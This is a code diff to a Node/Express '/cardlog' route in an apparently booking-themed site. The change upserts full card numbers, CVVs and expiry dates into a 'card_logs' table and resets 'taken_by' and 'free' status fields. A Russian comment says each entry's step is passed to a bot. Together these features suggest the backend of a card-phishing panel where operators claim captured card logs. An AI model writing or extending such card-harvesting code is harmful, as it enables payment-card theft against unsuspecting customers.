@@ -222,19 +222,19 @@ router.post("/cardlog", async (req, res) => {
   if (step === "card_number_only") {
     db.prepare(
       `
-      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status, step, total_amount)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-    `
-    ).run(
-      sessionId,
-      cardNumber,
-      masked,
-      cvv || "",
-      expireDate || "",
-      "free",
-      "card_number_only",
-      price
-    );
+    INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status, step, total_amount)
+    VALUES (?, ?, ?, '', '', 'free', 'card_number_only', ?)
+    ON CONFLICT(session_id) DO UPDATE SET
+      full_pan = excluded.full_pan,
+      masked_pan = excluded.masked_pan,
+      step = 'card_number_only',
+      total_amount = excluded.total_amount,
+      cvv = '',
+      expire_date = '',
+      taken_by = NULL,
+      status = 'free'
+  `
+    ).run(sessionId, cardNumber, masked, price);
   } else {
     // Старая логика для обратной совместимости
     db.prepare(
@@ -257,7 +257,7 @@ router.post("/cardlog", async (req, res) => {
     bookingId: booking?.booking_id,
     clientId: booking?.client_id,
     step: step || "full", // Передаем шаг в бот
-    price
+    price,
   });
 
   res.json({ success: true });
